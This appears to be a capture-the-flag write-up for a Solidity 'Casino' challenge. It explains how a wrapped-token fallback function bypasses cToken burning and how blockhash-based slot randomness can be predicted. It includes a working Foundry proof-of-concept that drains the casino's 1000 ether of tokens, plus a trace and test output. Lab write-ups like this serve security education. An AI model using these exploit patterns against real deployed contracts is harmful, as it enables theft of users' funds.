# Challenge - Casino

In this challenge, a `Casino` contract and a `wNative` contract were deployed. The `wNative` contract was designed similarly to `WETH` and was set as the accepted betting token for the casino contract.

The setup minted 1 and 1000 ether `wNativetokens` for the player and the casino, respectively.

## Objective of CTF

To pass this level, we needed to empty the wNative token in the Casino contract.

## Vulnerability Analysis

The `Casino` contract has a `play` function that allows players to bet and potentially win extra `cTokens` (`cToken.get(msg.sender, amount * slot())`). The relevant portion of the play function is shown below:

```solidity
function play(address token, uint256 amount) public checkPlay {
    _bet(token, amount);
    CasinoToken cToken = isCToken(token) ? CasinoToken(token) : CasinoToken(_tokenMap[token]);
    // play

    cToken.get(msg.sender, amount * slot());
}
```

In the `_bet` function, the contract first checks if the token is allowed, then uses a try-catch block to handle two possible token types. Initially, the function assumes that the token is a `cToken` and directly calls `cToken.bet(msg.sender, amount)`. If the token does not have the `bet(address, uint256)` function (which is the case for non-cTokens like wNative), the call fails and execution moves to the catch block.

```solidity
function _bet(address token, uint256 amount) internal {
    require(isAllowed(token), "Token not allowed");
    CasinoToken cToken = CasinoToken(token);
    try cToken.bet(msg.sender, amount) {}
    catch {
        cToken = CasinoToken(_tokenMap[token]);
        deposit(token, amount);
        cToken.bet(msg.sender, amount);
    }
}
```

Here lies the vulnerability. The `wNative` contract has a `fallback` function that gets triggered when no specific function is matched. As a result, if we bet using `wNative` tokens, the `cToken.bet(msg.sender, amount)` call will be bypassed, even if there are not enough `cTokens` to burn.

```solidity
fallback() external payable {
    deposit();
}
```

The `bet` function in the `CasinoToken` contract is supposed to burn tokens when a bet is placed:

```solidity
function bet(address account, uint256 amount) public onlyOwner {
    _burn(account, amount);
}
```

However, because the `fallback` function in the `wNative` contract intercepts the call, the `bet` function is effectively bypassed, allowing us to bet without burning any `cTokens`.

Additionally, the `slot` function, which determines the outcome of a bet, is predictable. It relies on `blockhash` and `block.number` as the source of randomness, but these values are not truly random. An attacker can call the `slot` function in advance to determine the outcome before placing a bet, allowing them to guarantee a win.

```solidity
function slot() public view returns (uint256) {
    unchecked {
        uint256 answer = uint256(blockhash(block.number - 1)) % 1000;
        uint256[3] memory slots = [(answer / 100) % 10, (answer / 10) % 10, answer % 10];
        if (slots[0] == slots[1] && slots[1] == slots[2]) {
            if (slots[0] == 7) {
                return 100;
            } else {
                return 10;
            }
        } else if (slots[0] == slots[1] || slots[1] == slots[2] || slots[0] == slots[2]) {
            return 3;
        } else {
            return 0;
        }
    }
}
```

There are two main vulnerabilities in the challenge:

1. The fallback mechanism in the `wNative` contract, which allows bets without burning cToken.
2. The predictability of the `slot` function, which allows an attacker to calculate the outcome before betting.

### Attack steps:

1. Call the `play` function after verifying that the `slot` function returns a value greater than zero. Place a bet with an amount of `1000 ether / slot() + 1`.

## PoC test case

```solidity
function testExploit() public {
    vm.startPrank(challenger);
    for (uint256 i; i < 100; ++i) {
        vm.roll(block.number + i);
        vm.warp(block.timestamp + i);

        if (casino.slot() == 10) {
            casino.play(wNative, 100 ether);
        }
    }

    casino.withdraw(wNative, 1000 ether);
    vm.stopPrank();

    base.solve();
    assertTrue(base.isSolved());
}
```

### Note:

If I test with the following snippet:

```solidity
if (casino.slot() > 0) {
    casino.play(wNative, 1e21 / casino.slot() + 1);
}
```

It will trigger with `EvmError: StateChangeDuringStaticCall`, I have no ideal why.

```
├─ [19859] Casino::play(WrappedNative: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], 333000000000000000000 [3.33e20])
    │   ├─ [2717] WrappedNative::bet(challenger: [0x9591B1C38D7ae6c50aA134A72bcF85fBf690fe51], 333000000000000000000 [3.33e20])
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: Casino: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], value: 0)
    │   │   └─ ← [Stop]
    │   ├─ [461] WrappedNative::underlying() [staticcall]
    │   │   └─ ← [StateChangeDuringStaticCall] EvmError: StateChangeDuringStaticCall
    │   └─ ← [OutOfGas] EvmError: OutOfGas
    └─ ← [Revert] EvmError: Revert
```

### Test Result

```
Ran 1 test for test/Casino.t.sol:CasinoTest
[PASS] testExploit() (gas: 1040581886)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.96ms (953.21µs CPU time)

Ran 1 test suite in 216.96ms (1.96ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
